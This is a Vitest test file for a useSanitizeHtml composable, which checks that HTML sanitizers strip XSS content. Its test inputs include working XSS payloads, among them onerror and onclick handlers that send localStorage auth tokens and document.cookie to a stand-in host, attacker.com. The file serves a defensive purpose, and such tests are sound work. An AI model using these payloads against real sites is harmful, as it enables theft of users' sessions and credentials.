import { describe, it, expect } from 'vitest'
import { useSanitizeHtml } from '~/composables/useSanitizeHtml'

describe('useSanitizeHtml', () => {
  const { sanitizeHtml, sanitizeStrict, sanitizeText } = useSanitizeHtml()

  describe('sanitizeHtml', () => {
    it('removes script tags', () => {
      const dirty = '<p>Hello <script>alert("XSS")</script></p>'
      const clean = sanitizeHtml(dirty)
      expect(clean).not.toContain('<script>')
      expect(clean).not.toContain('alert')
    })

    it('removes event handlers', () => {
      const dirty = '<img src=x onerror="alert(1)">'
      const clean = sanitizeHtml(dirty)
      expect(clean).not.toContain('onerror')
    })

    it('removes onclick handlers', () => {
      const dirty = '<div onclick="fetch(\'https://attacker.com?token=\'+localStorage.token)">Click me</div>'
      const clean = sanitizeHtml(dirty)
      expect(clean).not.toContain('onclick')
      expect(clean).not.toContain('fetch')
    })

    it('allows safe HTML tags', () => {
      const safe = '<p>Hello <strong>world</strong></p>'
      const clean = sanitizeHtml(safe)
      expect(clean).toContain('<p>')
      expect(clean).toContain('<strong>')
    })

    it('allows safe links', () => {
      const safe = '<a href="/docs">Documentation</a>'
      const clean = sanitizeHtml(safe)
      expect(clean).toContain('<a')
      expect(clean).toContain('href')
    })

    it('keeps content when removing tags', () => {
      const dirty = '<p>Hello <script>alert(1)</script>World</p>'
      const clean = sanitizeHtml(dirty)
      expect(clean).toContain('Hello')
      expect(clean).toContain('World')
    })

    it('removes SVG payload', () => {
      const dirty = '<svg onload="alert(\'XSS\')">'
      const clean = sanitizeHtml(dirty)
      expect(clean).not.toContain('onload')
    })

    it('handles HTML entities', () => {
      const safe = '<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>'
      const clean = sanitizeHtml(safe)
      // Entities are preserved and safe (not executable)
      expect(clean).toContain('&lt;')
      expect(clean).not.toContain('<script>')
    })

    it('returns empty string for null/undefined', () => {
      expect(sanitizeHtml('')).toBe('')
      expect(sanitizeHtml(null as any)).toBe('')
      expect(sanitizeHtml(undefined as any)).toBe('')
    })
  })

  describe('sanitizeStrict', () => {
    it('only allows basic formatting tags', () => {
      const html = '<p>Text with <strong>bold</strong> and <em>italic</em></p>'
      const clean = sanitizeStrict(html)
      expect(clean).toContain('<strong>')
      expect(clean).toContain('<em>')
      // <p> is not in allowedTags but content is kept
      expect(clean).toContain('Text with')
    })

    it('removes all attributes', () => {
      const dirty = '<p class="test" id="dangerous">Text</p>'
      const clean = sanitizeStrict(dirty)
      expect(clean).not.toContain('class')
      expect(clean).not.toContain('id')
    })
  })

  describe('sanitizeText', () => {
    it('removes all HTML tags and keeps text content', () => {
      const html = '<p>Hello <strong>world</strong></p>'
      const clean = sanitizeText(html)
      // All HTML tags should be removed
      expect(clean).not.toContain('<p>')
      // Content preserved (text only)
      expect(clean).toContain('Hello')
      expect(clean).toContain('world')
    })

    it('handles XSS payloads gracefully', () => {
      const payload = '<img src=x onerror="alert(\'XSS\')">'
      const clean = sanitizeText(payload)
      expect(clean).toBe('')
    })
  })

  describe('Real-world XSS payloads', () => {
    it('blocks localStorage token theft', () => {
      const payload = `<img src=x onerror="fetch('https://attacker.com/?token='+localStorage.getItem('auth_token'))">`
      const clean = sanitizeHtml(payload)
      expect(clean).not.toContain('localStorage')
      expect(clean).not.toContain('fetch')
      expect(clean).not.toContain('attacker.com')
    })

    it('blocks cookie stealing', () => {
      const payload = `<img src=x onerror="new Image().src='https://attacker.com/?cookie='+document.cookie">`
      const clean = sanitizeHtml(payload)
      expect(clean).not.toContain('document.cookie')
      expect(clean).not.toContain('attacker.com')
    })

    it('blocks javascript: protocol', () => {
      const payload = '<a href="javascript:alert(\'XSS\')">Click</a>'
      const clean = sanitizeHtml(payload)
      expect(clean).not.toContain('javascript:')
    })
  })
})
